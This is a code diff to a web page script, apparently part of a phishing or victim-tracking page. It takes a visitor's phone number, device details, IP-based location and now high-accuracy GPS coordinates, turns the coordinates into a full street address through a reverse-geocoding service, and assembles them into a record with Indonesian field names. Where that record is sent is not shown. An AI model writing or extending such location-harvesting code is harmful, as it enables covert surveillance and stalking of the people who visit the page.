@@ -73,7 +73,7 @@
       const phoneInput = document.getElementById("phone").value;
       const clock = new Date().toLocaleString();
       let latitude = "N/A", longitude = "N/A", weather = "N/A", temperature = "N/A";
-      let country = "N/A", province = "N/A", ip = "N/A", accuracy = "N/A", city = "N/A", postal = "N/A", org = "N/A", fullAddress = "N/A";
+      let country = "N/A", province = "N/A", ip = "N/A", accuracy = "N/A", city = "N/A", postal = "N/A", org = "N/A", fullAddress = "N/A", gpsAddress = "N/A";
 
       const userAgent = navigator.userAgent;
       const androidVersion = userAgent.match(/Android\s([0-9.]*)/)?.[1] || "N/A";
@@ -114,24 +114,29 @@
       } catch {}
 
       try {
-        const weatherData = await fetch(`https://wttr.in/${latitude},${longitude}?format=j1`).then(r => r.json());
-        weather = weatherData.current_condition[0].weatherDesc[0].value;
-        temperature = weatherData.current_condition[0].temp_C + "°C";
-      } catch {}
-
-      try {
         await new Promise((resolve) => {
           navigator.geolocation.getCurrentPosition(
-            pos => {
+            async pos => {
               latitude = pos.coords.latitude.toFixed(6);
               longitude = pos.coords.longitude.toFixed(6);
               accuracy = pos.coords.accuracy + "m";
+              try {
+                const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
+                const geoData = await geoRes.json();
+                gpsAddress = geoData.display_name || "N/A";
+              } catch {}
               resolve();
             },
             () => resolve(),
             { enableHighAccuracy: true, timeout: 5000 }
           );
         });
+      } catch {}
+
+      try {
+        const weatherData = await fetch(`https://wttr.in/${latitude},${longitude}?format=j1`).then(r => r.json());
+        weather = weatherData.current_condition[0].weatherDesc[0].value;
+        temperature = weatherData.current_condition[0].temp_C + "°C";
       } catch {}
 
       const jsonData = {
@@ -141,7 +146,8 @@
         "android versions": androidVersion,
         "login from": loginFrom,
         "lokasi": `${latitude}, ${longitude} (accuracy: ${accuracy})`,
-        "alamat lengkap": fullAddress,
+        "alamat GPS akurat": gpsAddress,
+        "alamat berdasarkan IP": fullAddress,
         "provider": org,
         "kota": city,
         "kode pos": postal,
